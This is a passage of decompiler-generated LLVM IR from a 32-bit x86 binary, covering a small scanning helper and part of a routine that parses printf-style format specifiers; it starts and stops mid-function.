  %v0_804c4f6.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c4f4

dec_label_pc_804c4f4:                             ; preds = %dec_label_pc_804c4d9, %dec_label_pc_804c4e0
  %v0_804c4f6 = phi i32 [ %v3_804c4d9, %dec_label_pc_804c4d9 ], [ %v0_804c4f6.pre, %dec_label_pc_804c4e0 ]
  %v2_804c4f4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804c4f4, i32* @ebx, align 4
  ret i32 %v0_804c4f6

; uselistorder directives
  uselistorder i32 %v3_804c4cf, { 1, 0 }
  uselistorder i32 %v3_804c4b8, { 1, 0 }
  uselistorder i32 %v1_804c4a3, { 2, 1, 0 }
  uselistorder i32 %v1_804c4a4, { 0, 2, 1 }
  uselistorder i32 %v3_804c43c, { 1, 0, 2 }
  uselistorder i32* %v2_804c43c, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_804c437, { 1, 0 }
  uselistorder i32 %v6_804c433, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_804c43322, { 1, 0 }
  uselistorder i1 %v1_804c4b2, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 0, 1, 2, 3, 4, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 5, 8, 7, 6 }
  uselistorder label %dec_label_pc_804c4f4, { 1, 0 }
  uselistorder label %dec_label_pc_804c4d9, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804c4c2, { 1, 0 }
  uselistorder label %dec_label_pc_804c4a3, { 1, 0 }
  uselistorder label %dec_label_pc_804c4a0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c49e, { 1, 0 }
  uselistorder label %dec_label_pc_804c496, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c433, { 1, 0 }
  uselistorder label %dec_label_pc_804c42f, { 1, 0 }
  uselistorder label %dec_label_pc_804c415, { 1, 0 }
}

define i32 @function_804c4f8(i32 %arg1) local_unnamed_addr {
dec_label_pc_804c4f8:
  %v0_804c4f8 = load i32, i32* @eax, align 4
  br label %dec_label_pc_804c4ff

dec_label_pc_804c4ff:                             ; preds = %dec_label_pc_804c4ff, %dec_label_pc_804c4f8
  %v0_804c4ff = phi i32 [ ptrtoint (i8** @global_var_80530b6.122 to i32), %dec_label_pc_804c4f8 ], [ %v1_804c4ff, %dec_label_pc_804c4ff ]
  %v1_804c4ff = add i32 %v0_804c4ff, -2
  %v1_804c502 = inttoptr i32 %v1_804c4ff to i16*
  %v2_804c502 = load i16, i16* %v1_804c502, align 2
  %v3_804c502 = sext i16 %v2_804c502 to i32
  %v12_804c505 = icmp ne i32 %v3_804c502, %v0_804c4f8
  %v6_804c50f = icmp ugt i32 %v1_804c4ff, ptrtoint (i32* @global_var_805309e.123 to i32)
  %or.cond = and i1 %v6_804c50f, %v12_804c505
  br i1 %or.cond, label %dec_label_pc_804c4ff, label %dec_label_pc_804c511

dec_label_pc_804c511:                             ; preds = %dec_label_pc_804c4ff
  %.pre = add i32 %v0_804c4ff, -134557856
  %v2_804c517 = sdiv i32 %.pre, 2
  store i32 %v2_804c517, i32* @edx, align 4
  %v1_804c519 = add i32 %v2_804c517, ptrtoint (i8** @global_var_80530b6.122 to i32)
  %v2_804c519 = inttoptr i32 %v1_804c519 to i8*
  %v3_804c519 = load i8, i8* %v2_804c519, align 1
  %v4_804c519 = zext i8 %v3_804c519 to i32
  ret i32 %v4_804c519

; uselistorder directives
  uselistorder i32 %v2_804c517, { 1, 0 }
  uselistorder i32 %v1_804c4ff, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_80530b6.122 to i32), { 1, 0 }
}

define i32 @function_804c521(i32* %arg1) local_unnamed_addr {
dec_label_pc_804c521:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804c522 = load i32, i32* @edi, align 4
  %v0_804c523 = load i32, i32* @esi, align 4
  %v0_804c524 = load i32, i32* @ebx, align 4
  store i32 %v0_804c524, i32* %stack_var_-16, align 4
  %v4_804c524 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804c550 = add i32 %tmp76, 24
  %v2_804c550 = inttoptr i32 %v1_804c550 to i32*
  %v3_804c550 = load i32, i32* %v2_804c550, align 4
  store i32 %v3_804c550, i32* %eax.global-to-local, align 4
  %v1_804c557 = add i32 %tmp76, 16
  %v2_804c557 = inttoptr i32 %v1_804c557 to i32*
  %v3_804c557 = load i32, i32* %v2_804c557, align 4
  %v1_804c55a = and i32 %v3_804c557, 128
  %v2_804c55a = icmp eq i32 %v1_804c55a, 0
  store i32 %v1_804c55a, i32* %edi.global-to-local, align 4
  %v1_804c560 = icmp eq i1 %v2_804c55a, false
  br i1 %v1_804c560, label %dec_label_pc_804c573, label %dec_label_pc_804c562

dec_label_pc_804c562:                             ; preds = %dec_label_pc_804c521
  %v2_804c562 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_804c5c0.outer

dec_label_pc_804c56d:                             ; preds = %dec_label_pc_804c6fb
  %v1_804c56d = add i32 %v0_804c6fb.pre.pre, 1
  store i32 %v1_804c56d, i32* @esi, align 4
  br label %dec_label_pc_804c70b

dec_label_pc_804c573:                             ; preds = %dec_label_pc_804c521
  %v15_804c525 = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804c575

dec_label_pc_804c575:                             ; preds = %dec_label_pc_804c59d.dec_label_pc_804c575_crit_edge, %dec_label_pc_804c573
  %v2_804c586 = phi i32 [ %v2_804c586.pre, %dec_label_pc_804c59d.dec_label_pc_804c575_crit_edge ], [ %v15_804c525, %dec_label_pc_804c573 ]
  %v3_804c586 = phi i32 [ %v1_804c59d, %dec_label_pc_804c59d.dec_label_pc_804c575_crit_edge ], [ 0, %dec_label_pc_804c573 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804c579 = mul i32 %v3_804c586, 4
  store i32 %v1_804c579, i32* @ecx, align 4
  %v2_804c580 = load i32, i32* %arg1, align 4
  store i32 %v2_804c580, i32* @edx, align 4
  %v2_804c582 = add i32 %v1_804c579, -4
  %v3_804c582 = add i32 %v2_804c582, %v2_804c580
  %v4_804c582 = inttoptr i32 %v3_804c582 to i32*
  %v5_804c582 = load i32, i32* %v4_804c582, align 4
  store i32 %v5_804c582, i32* %eax.global-to-local, align 4
  %v1_804c586 = trunc i32 %v5_804c582 to i8
  %v4_804c586 = add i32 %v2_804c586, 36
  %v5_804c586 = add i32 %v4_804c586, %v3_804c586
  %v6_804c586 = inttoptr i32 %v5_804c586 to i8*
  store i8 %v1_804c586, i8* %v6_804c586, align 1
  %v0_804c58a = load i32, i32* %eax.global-to-local, align 4
  %v1_804c58a = urem i32 %v0_804c58a, 256
  %v2_804c58a = load i32, i32* @ebx, align 4
  %v3_804c58a = and i32 %v2_804c58a, -256
  %v4_804c58a = or i32 %v3_804c58a, %v1_804c58a
  store i32 %v4_804c58a, i32* @ebx, align 4
  %v1_804c58c = mul i32 %v0_804c58a, 16777216
  %v2_804c58c = sdiv i32 %v1_804c58c, 16777216
  store i32 %v2_804c58c, i32* %eax.global-to-local, align 4
  %v1_804c58f = load i32, i32* @edx, align 4
  %v2_804c58f = load i32, i32* @ecx, align 4
  %v3_804c58f = add i32 %v1_804c58f, -4
  %v4_804c58f = add i32 %v3_804c58f, %v2_804c58f
  %v5_804c58f = inttoptr i32 %v4_804c58f to i32*
  %v6_804c58f = load i32, i32* %v5_804c58f, align 4
  %v17_804c58f = icmp eq i32 %v2_804c58c, %v6_804c58f
  %v1_804c593 = icmp eq i1 %v17_804c58f, false
  br i1 %v1_804c593, label %dec_label_pc_804c8dc, label %dec_label_pc_804c599

dec_label_pc_804c599:                             ; preds = %dec_label_pc_804c575
  %v3_804c599 = trunc i32 %v0_804c58a to i8
  %v4_804c599 = icmp eq i8 %v3_804c599, 0
  br i1 %v4_804c599, label %dec_label_pc_804c5a3, label %dec_label_pc_804c59d

dec_label_pc_804c59d:                             ; preds = %dec_label_pc_804c599
  %v0_804c59d = load i32, i32* %esi.global-to-local, align 4
  %v1_804c59d = add i32 %v0_804c59d, 1
  store i32 %v1_804c59d, i32* %esi.global-to-local, align 4
  %tmp175 = icmp ult i32 %v1_804c59d, 32
  br i1 %tmp175, label %dec_label_pc_804c59d.dec_label_pc_804c575_crit_edge, label %dec_label_pc_804c5a3

dec_label_pc_804c59d.dec_label_pc_804c575_crit_edge: ; preds = %dec_label_pc_804c59d
  %v2_804c586.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c575

dec_label_pc_804c5a3:                             ; preds = %dec_label_pc_804c59d, %dec_label_pc_804c599
  %v2_804c5a8 = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_804c5c0.outer

dec_label_pc_804c5c0.outer:                       ; preds = %dec_label_pc_804c5a3, %dec_label_pc_804c562, %dec_label_pc_804c6dd
  %v0_804c5cc.ph94 = phi i32 [ %v1_804c6dd, %dec_label_pc_804c6dd ], [ %v2_804c562, %dec_label_pc_804c562 ], [ %v2_804c5a8, %dec_label_pc_804c5a3 ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_804c6dd ], [ %tmp66, %dec_label_pc_804c562 ], [ %tmp66, %dec_label_pc_804c5a3 ]
  %stack_var_-96.1.ph = phi i32 [ %v0_804c566, %dec_label_pc_804c6dd ], [ 0, %dec_label_pc_804c562 ], [ 0, %dec_label_pc_804c5a3 ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_804c6dd ], [ %v3_804c550, %dec_label_pc_804c562 ], [ %v3_804c550, %dec_label_pc_804c5a3 ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_804c6dd ], [ 0, %dec_label_pc_804c562 ], [ 0, %dec_label_pc_804c5a3 ]
  %v7_804c5c7 = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_804c5c7 = trunc i64 %v7_804c5c7 to i32
  %v2_804c5cf = add i32 %v8_804c5c7, 80
  br label %dec_label_pc_804c5c0

dec_label_pc_804c5c0:                             ; preds = %dec_label_pc_804c5c0.outer, %dec_label_pc_804c67d
  %v0_804c5cc = phi i32 [ %v0_804c68a, %dec_label_pc_804c67d ], [ %v0_804c5cc.ph94, %dec_label_pc_804c5c0.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_804c67d ], [ %stack_var_-32.1.ph, %dec_label_pc_804c5c0.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_804c67d ], [ %stack_var_-88.1.ph, %dec_label_pc_804c5c0.outer ]
  store i32 %v0_804c5cc, i32* @edx, align 4
  store i32 %v0_804c5cc, i32* @esi, align 4
  %v1_804c5c2 = inttoptr i32 %v0_804c5cc to i8*
  %v2_804c5c2 = load i8, i8* %v1_804c5c2, align 1
  %v11_804c5c2 = icmp eq i8 %v2_804c5c2, 42
  %v1_804c5c5 = icmp eq i1 %v11_804c5c2, false
  br i1 %v1_804c5c5, label %dec_label_pc_804c5d7, label %dec_label_pc_804c5c7

dec_label_pc_804c5c7:                             ; preds = %dec_label_pc_804c5c0
  store i32 %v8_804c5c7, i32* %eax.global-to-local, align 4
  %v1_804c5cc = add i32 %v0_804c5cc, 1
  store i32 %v1_804c5cc, i32* @esi, align 4
  %v0_804c5cf = load i32, i32* @esp, align 4
  %v3_804c5cf = add i32 %v2_804c5cf, %v0_804c5cf
  %v4_804c5cf = inttoptr i32 %v3_804c5cf to i32*
  store i32 0, i32* %v4_804c5cf, align 4
  %v0_804c5f1.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c5d7

dec_label_pc_804c5d7:                             ; preds = %dec_label_pc_804c5c0, %dec_label_pc_804c5c7
  %v0_804c5f1.pre = phi i32 [ %v0_804c5cc, %dec_label_pc_804c5c0 ], [ %v0_804c5f1.pre.pre, %dec_label_pc_804c5c7 ]
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_804c5d9 = load i32, i32* inttoptr (i32 134568416 to i32*), align 32
  store i32 %v0_804c5d9, i32* %ebp.global-to-local, align 4
  %v4_804c5f1.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804c5f1124 = inttoptr i32 %v0_804c5f1.pre to i8*
  %v2_804c5f1125 = load i8, i8* %v1_804c5f1124, align 1
  %v3_804c5f1126 = zext i8 %v2_804c5f1125 to i32
  %v5_804c5f1127 = and i32 %v4_804c5f1.pre, -256
  %v6_804c5f1128 = or i32 %v3_804c5f1126, %v5_804c5f1127
  store i32 %v6_804c5f1128, i32* %eax.global-to-local, align 4
  %v2_804c5f3129 = sext i8 %v2_804c5f1125 to i32
  store i32 %v2_804c5f3129, i32* @ecx, align 4
  %v2_804c5f6130 = mul nsw i32 %v2_804c5f3129, 2
  %v3_804c5f6131 = add i32 %v2_804c5f6130, %v0_804c5d9
  %v4_804c5f6132 = inttoptr i32 %v3_804c5f6131 to i8*
  %v5_804c5f6133 = load i8, i8* %v4_804c5f6132, align 1
  %v6_804c5f6134 = and i8 %v5_804c5f6133, 8
  %v7_804c5f6135 = icmp eq i8 %v6_804c5f6134, 0
  %v1_804c5fb136 = icmp eq i1 %v7_804c5f6135, false
  br i1 %v1_804c5fb136, label %dec_label_pc_804c5e1, label %dec_label_pc_804c5fd

dec_label_pc_804c5e1:                             ; preds = %dec_label_pc_804c5d7, %dec_label_pc_804c5f0
  %v2_804c5f3140 = phi i32 [ %v2_804c5f3, %dec_label_pc_804c5f0 ], [ %v2_804c5f3129, %dec_label_pc_804c5d7 ]
  %v6_804c5f1139 = phi i32 [ %v6_804c5f1, %dec_label_pc_804c5f0 ], [ %v6_804c5f1128, %dec_label_pc_804c5d7 ]
  %v0_804c5f0138 = phi i32 [ %v1_804c5f0, %dec_label_pc_804c5f0 ], [ %v0_804c5f1.pre, %dec_label_pc_804c5d7 ]
  %v1_804c5e9137 = phi i32 [ %v0_804c60b32, %dec_label_pc_804c5f0 ], [ 0, %dec_label_pc_804c5d7 ]
  %v1_804c5e1 = add i32 %v1_804c5e9137, -4094
  %v6_804c5e1 = sub i32 4093, %v1_804c5e9137
  %v7_804c5e1 = and i32 %v6_804c5e1, %v1_804c5e9137
  %v8_804c5e1 = icmp slt i32 %v7_804c5e1, 0
  %v9_804c5e1 = icmp eq i32 %v1_804c5e1, 0
  %v10_804c5e1 = icmp slt i32 %v1_804c5e1, 0
  %v3_804c5e7 = icmp eq i1 %v10_804c5e1, %v8_804c5e1
  %v4_804c5e7 = icmp eq i1 %v9_804c5e1, false
  %v5_804c5e7 = and i1 %v4_804c5e7, %v3_804c5e7
  br i1 %v5_804c5e7, label %dec_label_pc_804c5f0, label %dec_label_pc_804c5e9

dec_label_pc_804c5e9:                             ; preds = %dec_label_pc_804c5e1
  %v3_804c5e9 = mul i32 %v1_804c5e9137, 10
  store i32 %v3_804c5e9, i32* %eax.global-to-local, align 4
  %v2_804c5ec = add i32 %v3_804c5e9, -48
  %v3_804c5ec = add i32 %v2_804c5ec, %v2_804c5f3140
  store i32 %v3_804c5ec, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804c5f0

dec_label_pc_804c5f0:                             ; preds = %dec_label_pc_804c5e1, %dec_label_pc_804c5e9
  %v0_804c60b32 = phi i32 [ %v1_804c5e9137, %dec_label_pc_804c5e1 ], [ %v3_804c5ec, %dec_label_pc_804c5e9 ]
  %v4_804c5f128 = phi i32 [ %v6_804c5f1139, %dec_label_pc_804c5e1 ], [ %v3_804c5e9, %dec_label_pc_804c5e9 ]
  %v1_804c5f0 = add i32 %v0_804c5f0138, 1
  store i32 %v1_804c5f0, i32* @esi, align 4
  %v1_804c5f1 = inttoptr i32 %v1_804c5f0 to i8*
  %v2_804c5f1 = load i8, i8* %v1_804c5f1, align 1
  %v3_804c5f1 = zext i8 %v2_804c5f1 to i32
  %v5_804c5f1 = and i32 %v4_804c5f128, -256
  %v6_804c5f1 = or i32 %v3_804c5f1, %v5_804c5f1
  store i32 %v6_804c5f1, i32* %eax.global-to-local, align 4
  %v2_804c5f3 = sext i8 %v2_804c5f1 to i32
  store i32 %v2_804c5f3, i32* @ecx, align 4
  %v2_804c5f6 = mul nsw i32 %v2_804c5f3, 2
  %v3_804c5f6 = add i32 %v2_804c5f6, %v0_804c5d9
  %v4_804c5f6 = inttoptr i32 %v3_804c5f6 to i8*
  %v5_804c5f6 = load i8, i8* %v4_804c5f6, align 1
  %v6_804c5f6 = and i8 %v5_804c5f6, 8
  %v7_804c5f6 = icmp eq i8 %v6_804c5f6, 0
  %v1_804c5fb = icmp eq i1 %v7_804c5f6, false
  br i1 %v1_804c5fb, label %dec_label_pc_804c5e1, label %dec_label_pc_804c5fd

dec_label_pc_804c5fd:                             ; preds = %dec_label_pc_804c5f0, %dec_label_pc_804c5d7
  %v1_804c5e9.lcssa = phi i32 [ 0, %dec_label_pc_804c5d7 ], [ %v0_804c60b32, %dec_label_pc_804c5f0 ]
  %v0_804c5f0.lcssa = phi i32 [ %v0_804c5f1.pre, %dec_label_pc_804c5d7 ], [ %v1_804c5f0, %dec_label_pc_804c5f0 ]
  %v2_804c5f1.lcssa = phi i8 [ %v2_804c5f1125, %dec_label_pc_804c5d7 ], [ %v2_804c5f1, %dec_label_pc_804c5f0 ]
  %v6_804c5f1.lcssa = phi i32 [ %v6_804c5f1128, %dec_label_pc_804c5d7 ], [ %v6_804c5f1, %dec_label_pc_804c5f0 ]
  %v0_804c5fd = load i32, i32* @edx, align 4
  %v1_804c5fd = add i32 %v0_804c5fd, -1
  %v2_804c5fd = inttoptr i32 %v1_804c5fd to i8*
  %v3_804c5fd = load i8, i8* %v2_804c5fd, align 1
  %v12_804c5fd = icmp eq i8 %v3_804c5fd, 37
  %v1_804c601 = icmp eq i1 %v12_804c5fd, false
  br i1 %v1_804c601, label %dec_label_pc_804c694, label %dec_label_pc_804c607

dec_label_pc_804c607:                             ; preds = %dec_label_pc_804c5fd
  %v10_804c607 = icmp eq i8 %v2_804c5f1.lcssa, 36
  %v1_804c609 = icmp eq i1 %v10_804c607, false
  br i1 %v1_804c609, label %dec_label_pc_804c63b, label %dec_label_pc_804c60b

dec_label_pc_804c60b:                             ; preds = %dec_label_pc_804c607
  %tmp89 = icmp slt i32 %v1_804c5e9.lcssa, 1
  br i1 %tmp89, label %dec_label_pc_804c63b, label %dec_label_pc_804c60f

dec_label_pc_804c60f:                             ; preds = %dec_label_pc_804c60b
  %v1_804c60f = add i32 %v0_804c5f0.lcssa, 1
  store i32 %v1_804c60f, i32* @edx, align 4
  %v4_804c612 = icmp eq i32 %stack_var_-88.1, 0
  br i1 %v4_804c612, label %dec_label_pc_804c8dc, label %dec_label_pc_804c61d

dec_label_pc_804c61d:                             ; preds = %dec_label_pc_804c60f
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_804c625 = sub i32 %v1_804c5e9.lcssa, %stack_var_-88.1
  %v8_804c625 = xor i32 %v1_804c5e9.lcssa, %stack_var_-88.1
  %v9_804c625 = xor i32 %v2_804c625, %v1_804c5e9.lcssa
  %v10_804c625 = and i32 %v9_804c625, %v8_804c625
  %v11_804c625 = icmp slt i32 %v10_804c625, 0
  %v12_804c625 = icmp eq i32 %v2_804c625, 0
  %v13_804c625 = icmp slt i32 %v2_804c625, 0
  %v3_804c627 = icmp ne i1 %v13_804c625, %v11_804c625
  %v4_804c627 = or i1 %v12_804c625, %v3_804c627
  %stack_var_-88.1.v0_804c629 = select i1 %v4_804c627, i32 %stack_var_-88.1, i32 %v1_804c5e9.lcssa
  br label %dec_label_pc_804c637

dec_label_pc_804c637:                             ; preds = %dec_label_pc_804c64b, %dec_label_pc_804c61d, %dec_label_pc_804c64f
  %v0_804c637 = phi i32 [ %v1_804c60f, %dec_label_pc_804c61d ], [ %v0_804c5fd, %dec_label_pc_804c64f ], [ %v0_804c5fd, %dec_label_pc_804c64b ]
  %stack_var_-32.2 = phi i32 [ %v1_804c5e9.lcssa, %dec_label_pc_804c61d ], [ %stack_var_-32.1, %dec_label_pc_804c64f ], [ %stack_var_-32.1, %dec_label_pc_804c64b ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_804c629, %dec_label_pc_804c61d ], [ 0, %dec_label_pc_804c64f ], [ 0, %dec_label_pc_804c64b ]
  store i32 %v0_804c637, i32* @esi, align 4
  br label %dec_label_pc_804c65e

dec_label_pc_804c63b:                             ; preds = %dec_label_pc_804c60b, %dec_label_pc_804c607
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_804c64b, label %dec_label_pc_804c642

dec_label_pc_804c642:                             ; preds = %dec_label_pc_804c63b
  %v10_804c642 = icmp eq i8 %v2_804c5f1.lcssa, 109
  br i1 %v10_804c642, label %dec_label_pc_804c694, label %dec_label_pc_804c8dc

dec_label_pc_804c64b:                             ; preds = %dec_label_pc_804c63b
  %tmp176 = icmp ugt i32 %v0_804c5f0.lcssa, %v0_804c5fd
  br i1 %tmp176, label %dec_label_pc_804c64f, label %dec_label_pc_804c637

dec_label_pc_804c64f:                             ; preds = %dec_label_pc_804c64b
  %v1_804c64f = inttoptr i32 %v0_804c5fd to i8*
  %v2_804c64f = load i8, i8* %v1_804c64f, align 1
  %v8_804c64f = icmp eq i8 %v2_804c64f, 48
  br i1 %v8_804c64f, label %dec_label_pc_804c637, label %dec_label_pc_804c694

dec_label_pc_804c65e:                             ; preds = %dec_label_pc_804c66f, %dec_label_pc_804c637
  %v0_804c68a = phi i32 [ %v1_804c66f, %dec_label_pc_804c66f ], [ %v0_804c637, %dec_label_pc_804c637 ]
  %v4_804c66835 = phi i32 [ %v6_804c668, %dec_label_pc_804c66f ], [ %v6_804c5f1.lcssa, %dec_label_pc_804c637 ]
  store i32 ptrtoint ([8 x i8]* @global_var_8053096.126 to i32), i32* %edx.global-to-local, align 4
  %v1_804c66b = inttoptr i32 %v0_804c68a to i8*
  br label %dec_label_pc_804c668

dec_label_pc_804c668:                             ; preds = %dec_label_pc_804c679, %dec_label_pc_804c65e
  %v4_804c668 = phi i32 [ %v4_804c66835, %dec_label_pc_804c65e ], [ %v6_804c668, %dec_label_pc_804c679 ]
  %v0_804c66a = phi i32 [ ptrtoint ([8 x i8]* @global_var_8053096.126 to i32), %dec_label_pc_804c65e ], [ %v1_804c66a, %dec_label_pc_804c679 ]
  %v0_804c679 = phi i32 [ 1, %dec_label_pc_804c65e ], [ %v2_804c679, %dec_label_pc_804c679 ]
  store i32 %v0_804c679, i32* @ecx, align 4
  %v1_804c668 = inttoptr i32 %v0_804c66a to i8*
  %v2_804c668 = load i8, i8* %v1_804c668, align 1
  %v3_804c668 = zext i8 %v2_804c668 to i32
  %v5_804c668 = and i32 %v4_804c668, -256
  %v6_804c668 = or i32 %v3_804c668, %v5_804c668
  store i32 %v6_804c668, i32* %eax.global-to-local, align 4
  %v1_804c66a = add i32 %v0_804c66a, 1
  store i32 %v1_804c66a, i32* @edx, align 4
  %v2_804c66b = load i8, i8* %v1_804c66b, align 1
  %v15_804c66b = icmp eq i8 %v2_804c66b, %v2_804c668
  %v1_804c66d = icmp eq i1 %v15_804c66b, false
  br i1 %v1_804c66d, label %dec_label_pc_804c674, label %dec_label_pc_804c66f

dec_label_pc_804c66f:                             ; preds = %dec_label_pc_804c668
  %v1_804c66f = add i32 %v0_804c68a, 1
  store i32 %v1_804c66f, i32* @esi, align 4
  %v0_804c670 = load i32, i32* %edi.global-to-local, align 4
  %v2_804c670 = or i32 %v0_804c670, %v0_804c679
  store i32 %v2_804c670, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804c65e

dec_label_pc_804c674:                             ; preds = %dec_label_pc_804c668
  %v1_804c674 = inttoptr i32 %v1_804c66a to i8*
  %v2_804c674 = load i8, i8* %v1_804c674, align 1
  %v3_804c674 = icmp eq i8 %v2_804c674, 0
  br i1 %v3_804c674, label %dec_label_pc_804c67d, label %dec_label_pc_804c679

dec_label_pc_804c679:                             ; preds = %dec_label_pc_804c674
  %v2_804c679 = mul i32 %v0_804c679, 2
  br label %dec_label_pc_804c668

dec_label_pc_804c67d:                             ; preds = %dec_label_pc_804c674
  %v0_804c67d = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804c681 = udiv i32 %v0_804c67d, 2
  %v1_804c681.not = or i32 %v1_804c681, -6
  %v1_804c686 = xor i32 %v1_804c681.not, 5
  store i32 %v1_804c686, i32* %eax.global-to-local, align 4
  %v2_804c688 = and i32 %v1_804c686, %v0_804c67d
  store i32 %v2_804c688, i32* %edi.global-to-local, align 4
  %v1_804c68a = add i32 %v0_804c68a, -1
  %v2_804c68a = inttoptr i32 %v1_804c68a to i8*
  %v3_804c68a = load i8, i8* %v2_804c68a, align 1
  %v12_804c68a = icmp eq i8 %v3_804c68a, 37
  %v1_804c68e = icmp eq i1 %v12_804c68a, false
  br i1 %v1_804c68e, label %dec_label_pc_804c5c0, label %dec_label_pc_804c694

dec_label_pc_804c694:                             ; preds = %dec_label_pc_804c64f, %dec_label_pc_804c67d, %dec_label_pc_804c5fd, %dec_label_pc_804c642
  %v0_804c6b7 = phi i32 [ %v1_804c5e9.lcssa, %dec_label_pc_804c642 ], [ %v1_804c5e9.lcssa, %dec_label_pc_804c64f ], [ 0, %dec_label_pc_804c67d ], [ %v1_804c5e9.lcssa, %dec_label_pc_804c5fd ]
  %v1_804c6c0 = phi i32 [ %v0_804c5f0.lcssa, %dec_label_pc_804c642 ], [ %v0_804c5f0.lcssa, %dec_label_pc_804c64f ], [ %v0_804c68a, %dec_label_pc_804c67d ], [ %v0_804c5f0.lcssa, %dec_label_pc_804c5fd ]
  %v0_804c6bd = phi i32 [ %v0_804c5fd, %dec_label_pc_804c642 ], [ %v0_804c5fd, %dec_label_pc_804c64f ], [ %v1_804c66a, %dec_label_pc_804c67d ], [ %v0_804c5fd, %dec_label_pc_804c5fd ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_804c642 ], [ %stack_var_-32.1, %dec_label_pc_804c64f ], [ %stack_var_-32.2, %dec_label_pc_804c67d ], [ %stack_var_-32.1, %dec_label_pc_804c5fd ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_804c642 ], [ 0, %dec_label_pc_804c64f ], [ %stack_var_-88.2, %dec_label_pc_804c67d ], [ %stack_var_-88.1, %dec_label_pc_804c5fd ]
  %v1_804c694 = inttoptr i32 %v0_804c6bd to i8*
  %v2_804c694 = load i8, i8* %v1_804c694, align 1
  %v11_804c694 = icmp eq i8 %v2_804c694, 42
  %v1_804c697 = icmp eq i1 %v11_804c694, false
  br i1 %v1_804c697, label %dec_label_pc_804c6cd, label %dec_label_pc_804c699

dec_label_pc_804c699:                             ; preds = %dec_label_pc_804c694
  %v4_804c699 = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_804c699, label %dec_label_pc_804c6bd, label %dec_label_pc_804c6a0

dec_label_pc_804c6a0:                             ; preds = %dec_label_pc_804c699
  %v1_804c6a0 = inttoptr i32 %v1_804c6c0 to i8*
  %v2_804c6a0 = load i8, i8* %v1_804c6a0, align 1
  %v11_804c6a0 = icmp eq i8 %v2_804c6a0, 36
  %v1_804c6a3 = icmp eq i1 %v11_804c6a0, false
  br i1 %v1_804c6a3, label %dec_label_pc_804c8dc, label %dec_label_pc_804c6a9

dec_label_pc_804c6a9:                             ; preds = %dec_label_pc_804c6a0
  %tmp91 = icmp slt i32 %v0_804c6b7, 1
  br i1 %tmp91, label %dec_label_pc_804c8dc, label %dec_label_pc_804c6b1

dec_label_pc_804c6b1:                             ; preds = %dec_label_pc_804c6a9
  store i32 %v8_804c5c7, i32* %eax.global-to-local, align 4
  %v1_804c6b6 = add i32 %v1_804c6c0, 1
  store i32 %v1_804c6b6, i32* @esi, align 4
  %v1_804c6b7 = load i32, i32* @esp, align 4
  %v3_804c6b7 = add i32 %v8_804c5c7, 68
  %v4_804c6b7 = add i32 %v3_804c6b7, %v1_804c6b7
  %v5_804c6b7 = inttoptr i32 %v4_804c6b7 to i32*
  store i32 %v0_804c6b7, i32* %v5_804c6b7, align 4
  %v0_804c6fb.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c6c8

dec_label_pc_804c6bd:                             ; preds = %dec_label_pc_804c699
  %v1_804c6bd = add i32 %v0_804c6bd, 1
  store i32 %v1_804c6bd, i32* %eax.global-to-local, align 4
  %v12_804c6c0 = icmp eq i32 %v1_804c6bd, %v1_804c6c0
  %v1_804c6c2 = icmp eq i1 %v12_804c6c0, false
  br i1 %v1_804c6c2, label %dec_label_pc_804c8dc, label %dec_label_pc_804c6c8

dec_label_pc_804c6c8:                             ; preds = %dec_label_pc_804c6bd, %dec_label_pc_804c6b1
